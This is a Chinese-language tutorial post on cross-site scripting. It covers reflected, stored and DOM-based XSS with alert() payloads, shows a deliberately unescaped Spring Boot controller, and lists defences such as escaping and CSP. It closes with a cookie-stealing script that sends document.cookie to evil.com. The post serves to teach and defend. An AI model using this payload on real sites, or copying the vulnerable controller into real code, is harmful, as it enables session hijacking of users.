---
title: XSS（跨站脚本攻击）
date: 2025-06-26
categories:
  - 安全
---

# 跨站脚本攻击（XSS）

XSS（Cross-Site Scripting，跨站脚本攻击）是一种常见的 Web 安全漏洞，攻击者通过在网页中注入恶意脚本，使脚本在用户浏览器中执行，从而窃取用户信息、冒充用户操作等。

## 分类
XSS 攻击主要分为三类：

### 1. 反射型 XSS
攻击代码作为请求参数提交，服务器端将其原样返回并在页面中立即执行。

**示例：**
```
https://example.com/search?q=<script>alert('xss')</script>
```
如果后端直接将 `q` 参数输出到页面，脚本会被执行。

### 2. 存储型 XSS
攻击代码被存储在服务器（如数据库、日志、评论等），其他用户访问时会被加载并执行。

**示例：**
用户在评论区提交：
```html
<script>alert('xss')</script>
```
所有访问该评论的用户都会触发弹窗。

### 3. DOM 型 XSS
前端 JavaScript 动态拼接或插入未经过滤的用户输入，导致脚本执行。

**示例：**
```html
<!-- 前端代码 -->
document.getElementById('result').innerHTML = location.hash.substring(1);
```
访问：
```
https://example.com/#<img src=1 onerror=alert('xss')>
```
会导致 XSS。

## 原理
攻击者将恶意 JavaScript 代码注入到网页中，当其他用户访问该页面时，恶意代码在其浏览器中执行，可能导致 Cookie 泄露、会话劫持、页面仿冒等安全问题。

## 错误编码示例
如下是易受 XSS 攻击的后端代码示例（以 Java Spring Boot 为例）：

```java
// 未做任何输出转义的 Controller
@RestController
public class CommentController {
    @PostMapping("/comment")
    public String comment(@RequestParam String content) {
        // 直接输出用户输入内容，存在 XSS 风险
        return "<div>" + content + "</div>";
    }
}
```

上述代码未对用户输入进行转义，攻击者可提交如下内容：

```html
<script>alert('XSS');</script>
```

页面渲染后会弹窗，证明 XSS 攻击成功。

## 安全编码方式
1. 对所有输出到页面的内容进行 HTML 转义。
2. 严格校验和过滤用户输入。
3. 禁止在页面中使用 `innerHTML`、`eval` 等高危 API。
4. 设置合适的 CSP（内容安全策略）。

**Java Spring Boot 输出转义示例：**

```java
// 使用 Thymeleaf 等模板引擎自动转义
<p th:text="${content}"></p>
```

**前端转义示例：**

```js
function escapeHtml(str) {
  return str.replace(/[&<>"']/g, function (c) {
    return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;','\'':'&#39;'}[c];
  });
}
```

## 攻击例子
攻击者提交如下评论内容：

```html
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

如果未做防护，用户访问评论区时 Cookie 会被窃取。

